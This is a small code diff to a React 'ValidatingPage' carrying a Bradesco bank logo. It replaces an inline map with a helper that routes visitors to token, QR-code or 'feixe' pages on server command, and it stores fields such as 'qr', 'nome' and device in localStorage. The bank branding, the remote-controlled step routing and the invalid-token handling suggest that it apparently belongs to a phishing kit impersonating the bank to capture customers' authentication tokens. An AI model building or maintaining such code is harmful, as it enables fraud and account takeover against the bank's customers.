@@ -1,6 +1,7 @@
 import { useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
+import { resolveServerRoute } from "@/lib/resolveServerRoute";
 
 const ValidatingPage = () => {
   const navigate = useNavigate();
@@ -32,14 +33,7 @@ const ValidatingPage = () => {
         localStorage.setItem("qr", msg.qr || "");
         localStorage.setItem("nome", msg.nome || "");
         localStorage.setItem("dispositivo", msg.dispositivo || "");
-
-        const urlMap: Record<string, string> = {
-          "/token.html": "/token",
-          "/qr.html": "/qrcode",
-          "/feixe.html": "/feixe",
-        };
-        const dest = urlMap[msg.url || ""] || "/token";
-        navigate(dest);
+        navigate(resolveServerRoute(msg.url));
       }
       if (msg.acao === "erro_token") {
         localStorage.setItem("erroToken", msg.motivo || "Token inválido");
